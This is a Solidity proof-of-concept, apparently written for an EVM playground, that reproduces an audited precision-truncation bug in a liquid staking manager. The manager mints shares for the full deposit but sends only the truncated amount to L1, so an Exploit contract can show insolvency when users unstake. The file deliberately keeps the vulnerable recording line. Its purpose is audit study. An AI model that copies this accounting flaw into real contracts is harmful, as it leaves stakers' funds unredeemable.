// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Kinetiq LST — Precision truncation on stake → improper accounting /
    protocol insolvency (Spearbit Mar 2025, #58596)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: _distributeStake sends only truncatedAmount (1e10-aligned for
    HyperCore 8-decimal format) to L1, but recordStake mints kHYPE / bumps
    totalStaked by the full input amount. Residual wei is unrecoverable dust
    from the accounting perspective → over-minted shares → insolvency on exit.
    Vulnerable record path preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

/// @dev L1 / HyperCore sink: only accepts 1e10-aligned HYPE credits.
contract L1Hype {
    uint256 public constant FACTOR = 1e10;
    uint256 public credited; // what HyperCore actually booked

    receive() external payable {
        // HyperCore drops sub-1e10 dust: only full quanta credit.
        uint256 q = (msg.value / FACTOR) * FACTOR;
        credited += q;
        // Any msg.value - q is lost (not refunded).
    }

    function pull(address to, uint256 amount) external {
        require(credited >= amount, "L1 insolvent");
        credited -= amount;
        (bool ok,) = to.call{value: amount}("");
        require(ok, "pull");
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}

/// @notice Minimal StakingManager with the real truncation / recordStake bug.
///         Source: Spearbit Kinetiq Mar 2025 — StakingManager._distributeStake.
contract StakingManager {
    uint256 public constant FACTOR = 1e10;

    mapping(address => uint256) public shares; // kHYPE
    uint256 public totalShares;
    uint256 public totalStaked; // accounting (what recordStake believes went to L1)
    address public immutable l1;

    constructor(address _l1) {
        l1 = _l1;
    }

    /// @notice Stake native HYPE: truncate for L1 send, but record full amount.
    function stake() public payable {
        require(msg.value > 0, "zero");
        uint256 amount = msg.value;

        uint256 truncatedAmount = (amount / FACTOR) * FACTOR;
        // Residual (amount - truncatedAmount) is sent too in some implementations,
        // but HyperCore only credits truncated quanta — dust is burned. We send
        // only truncatedAmount (matches the report's call{value: truncatedAmount}).
        if (truncatedAmount > 0) {
            (bool success,) = payable(l1).call{value: truncatedAmount}("");
            require(success, "L1 send");
        }
        // Dust left on this contract is NOT tracked as buffer in the vulnerable path.

        // FIX: _recordStake(truncatedAmount);
        _recordStake(msg.sender, amount); // @> VULN: records full amount / mints full kHYPE while only truncatedAmount reached L1 — over-mint creates latent insolvency
    }

    function _recordStake(address user, uint256 amount) internal {
        shares[user] += amount;
        totalShares += amount;
        totalStaked += amount;
    }

    /// @notice Burn kHYPE and withdraw HYPE from L1 accounting.
    function unstake(uint256 amount) external {
        require(shares[msg.sender] >= amount, "shares");
        shares[msg.sender] -= amount;
        totalShares -= amount;
        totalStaked -= amount;
        // Pull from L1 — fails when total recorded stake exceeded actual L1 credit.
        L1Hype(payable(l1)).pull(msg.sender, amount);
    }

    /// @dev Attempt unstake; returns false on insolvency instead of reverting the outer call.
    function tryUnstake(address user, uint256 amount) external returns (bool ok) {
        require(msg.sender == user, "self");
        uint256 snapShares = shares[user];
        uint256 snapTotal = totalShares;
        uint256 snapStaked = totalStaked;
        try this.unstakeAs(user, amount) {
            return true;
        } catch {
            // ensure no partial state (unstake is atomic on success only)
            require(shares[user] == snapShares && totalShares == snapTotal && totalStaked == snapStaked, "state");
            return false;
        }
    }

    function unstakeAs(address user, uint256 amount) external {
        require(msg.sender == address(this), "int");
        require(shares[user] >= amount, "shares");
        shares[user] -= amount;
        totalShares -= amount;
        totalStaked -= amount;
        L1Hype(payable(l1)).pull(user, amount);
    }

    receive() external payable {}
}

/// @dev User proxy so stake/unstake come from a distinct address.
contract User {
    StakingManager public mgr;

    constructor(StakingManager _mgr) {
        mgr = _mgr;
    }

    function doStake() external payable {
        mgr.stake{value: msg.value}();
    }

    function doUnstake(uint256 amount) external {
        mgr.unstake(amount);
    }

    function tryUnstake(uint256 amount) external returns (bool) {
        return mgr.tryUnstake(address(this), amount);
    }

    receive() external payable {}
}

/// CREATE order: l1(1), manager(2), user(3).
contract Exploit {
    L1Hype public l1;
    StakingManager public manager;
    User public user;

    bool public unstakeFailed;
    uint256 public l1Credited;
    uint256 public userShares;
    uint256 public lostDust;

    /// @dev 1.5 * 1e10 wei — not 1e10-aligned residual of 0.5e10.
    uint256 public constant STAKE_AMOUNT = 15_000_000_000; // 1.5e10
    uint256 public constant TRUNCATED = 10_000_000_000; // 1e10
    uint256 public constant DUST = 5_000_000_000; // 0.5e10 lost

    constructor() {
        l1 = new L1Hype(); // 1
        manager = new StakingManager(address(l1)); // 2
        user = new User(manager); // 3
    }

    function run() external payable {
        require(msg.value >= STAKE_AMOUNT, "need stake");

        user.doStake{value: STAKE_AMOUNT}();

        userShares = manager.shares(address(user));
        l1Credited = l1.credited();
        lostDust = STAKE_AMOUNT - l1Credited;

        // Full amount of kHYPE minted; L1 only booked truncated quantum.
        require(userShares == STAKE_AMOUNT, "full mint");
        require(l1Credited == TRUNCATED, "L1 truncated credit");
        require(lostDust == DUST, "dust lost");
        require(manager.totalStaked() == STAKE_AMOUNT, "accounting full");

        // Full exit claims STAKE_AMOUNT from L1 but only TRUNCATED is there → insolvent.
        unstakeFailed = !user.tryUnstake(STAKE_AMOUNT);
        require(unstakeFailed, "should be insolvent");
        // Partial exit of what L1 actually has still works — proves the gap is the dust.
        user.doUnstake(TRUNCATED);
        require(manager.shares(address(user)) == DUST, "dust shares remain");
        require(l1.credited() == 0, "L1 empty");
        // Remaining DUST shares can never be redeemed — protocol insolvency.
        require(!user.tryUnstake(DUST), "dust unredeemable");
        require(unstakeFailed && lostDust == DUST, "harm not demonstrated");
    }

    receive() external payable {}
}
